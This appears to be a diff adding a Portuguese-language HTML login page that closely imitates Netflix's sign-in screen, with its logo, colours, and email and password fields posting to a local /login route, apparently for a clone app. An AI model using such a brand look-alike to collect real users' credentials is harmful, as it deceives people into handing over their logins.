@@ -1,0 +1,84 @@
+<style>
+    body { 
+        background-image: url('/assets/img/the_netflix_login_background__canada__2024___by_logofeveryt_dh0w8qv-pre.jpg');
+        background-size: cover;
+        background-position: center;
+        background-repeat: no-repeat;
+        background-attachment: fixed; 
+        background-color: #000; 
+        color: #fff;
+        font-family: Arial, Helvetica, sans-serif;
+    }
+    
+    body::before {
+        content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+        background: rgba(0, 0, 0, 0.5); z-index: -1;
+    }
+
+    .logo { width: 140px; margin: 20px; }
+    .login-container { display: flex; justify-content: center; align-items: center; height: 100vh; }
+    .login-box { background-color: rgba(0, 0, 0, 0.75); padding: 60px; border-radius: 8px; max-width: 450px; width: 100%; }
+    .login-box h1 { font-size: 2rem; margin-bottom: 25px; font-weight: bold; }
+    
+    .form-control { background-color: #333; border: none; color: #fff; height: 50px; }
+    .form-control:focus { background-color: #444; color: #fff; box-shadow: none; }
+    
+    .input-group-text { background-color: #333; border: none; color: #8c8c8c; cursor: pointer; }
+    .input-group-text:hover { color: white; }
+
+    .btn-login { background-color: #e50914; border: none; font-weight: bold; font-size: 1rem; margin-top: 15px; }
+    .btn-login:hover { background-color: #f40612; }
+    .extra-links, .extra-links a { color: #b3b3b3; font-size: 0.9rem; text-decoration: none; }
+    .extra-links a:hover { text-decoration: underline; }
+</style>
+
+<div class="container-fluid">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" class="logo">
+</div>
+
+<div class="login-container">
+    <div class="login-box">
+        <h1>Entrar</h1>
+        <form action="/login" method="POST">
+            <div class="mb-3">
+                <input type="email" name="email" class="form-control" placeholder="Email ou número de telefone" required>
+            </div>
+            
+            <div class="input-group mb-3">
+                <input type="password" name="password" class="form-control" id="senhaInput" placeholder="Senha" required>
+                <span class="input-group-text" onclick="toggleSenha()">
+                    <i class="bi bi-eye-slash" id="iconeSenha"></i>
+                </span>
+            </div>
+
+            <button type="submit" class="btn btn-login w-100 py-2 mb-3">Entrar</button>
+            
+            <div class="d-flex justify-content-between extra-links">
+                <div>
+                    <input type="checkbox" id="remember"> <label for="remember">Lembre-se de mim</label>
+                </div>
+                <a href="#">Precisa de ajuda?</a>
+            </div>
+        </form>
+        
+        <div class="extra-links mt-3">
+            <p>Novo por aqui? <a href="/cadastro" style="color: white;">Assine agora</a></p>
+        </div>
+    </div>
+</div>
+
+<script>
+    function toggleSenha() {
+        const input = document.getElementById('senhaInput');
+        const icone = document.getElementById('iconeSenha');
+        if (input.type === 'password') {
+            input.type = 'text';
+            icone.classList.remove('bi-eye-slash');
+            icone.classList.add('bi-eye');
+        } else {
+            input.type = 'password';
+            icone.classList.remove('bi-eye');
+            icone.classList.add('bi-eye-slash');
+        }
+    }
+</script>
